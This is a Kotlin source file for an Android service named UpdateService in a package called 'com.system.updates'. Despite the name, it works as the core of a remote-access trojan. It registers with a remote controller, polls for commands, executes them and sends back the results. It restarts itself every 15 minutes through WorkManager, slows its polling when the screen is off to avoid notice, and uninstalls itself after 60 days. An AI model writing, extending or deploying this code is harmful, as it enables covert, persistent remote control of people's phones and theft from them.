package com.system.updates

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.work.*
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit

class UpdateService : Service() {
    private val sc = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var cr: CryptoManager
    private lateinit var co: Communicator
    private lateinit var ex: CommandExecutor
    private var sd = 0L
    private var lm = 0L

    override fun onCreate() {
        super.onCreate()
        cr = CryptoManager(this)
        co = Communicator(this, cr)
        ex = CommandExecutor(this, cr)
        sd = System.currentTimeMillis()
        spw()
        sc.launch {
            reg()
            hb()
        }
    }

    private fun spw() {
        val c = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
        val w = PeriodicWorkRequestBuilder<UpWkr>(15, TimeUnit.MINUTES)
            .setConstraints(c)
            .setBackoffCriteria(BackoffPolicy.LINEAR, 5, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("upwk", ExistingPeriodicWorkPolicy.KEEP, w)
    }

    private suspend fun reg() {
        if (!co.isR()) co.reg()
    }

    private suspend fun hb() {
        while (true) {
            try {
                val cmds = co.fetch()
                cmds.forEach { cmd ->
                    val r = ex.execute(cmd)
                    co.sendRes(cmd, r)
                }
                val d = delayTime()
                lm = System.currentTimeMillis()
                if (lm - sd > 5184000000L) { // 60 days
                    selfDestruct()
                }
                delay(d)
            } catch (e: Exception) {
                Log.e("UpSvc", "hb err", e)
                delay(60000)
            }
        }
    }

    private fun delayTime(): Long {
        val pm = getSystemService(PowerManager::class.java)
        val scOff = !pm.isInteractive
        val b = pm.isPowerSavingMode
        var d = 30000L
        if (scOff) d = 60000L
        if (b) d = 120000L
        return d
    }

    private fun selfDestruct() {
        sc.launch {
            try {
                val p = applicationContext.packageManager
                val i = Intent(Intent.ACTION_DELETE)
                i.data = android.net.Uri.parse("package:$packageName")
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(i)
            } catch (e: Exception) {
                Log.e("UpSvc", "sd err", e)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        sc.cancel()
        super.onDestroy()
    }

    class UpWkr(ctx: android.content.Context, p: WorkerParameters) : Worker(ctx, p) {
        override fun doWork(): Result {
            return try {
                val i = Intent(ctx, UpdateService::class.java)
                ctx.startService(i)
                Result.success()
            } catch (e: Exception) {
                Result.retry()
            }
        }
    }
}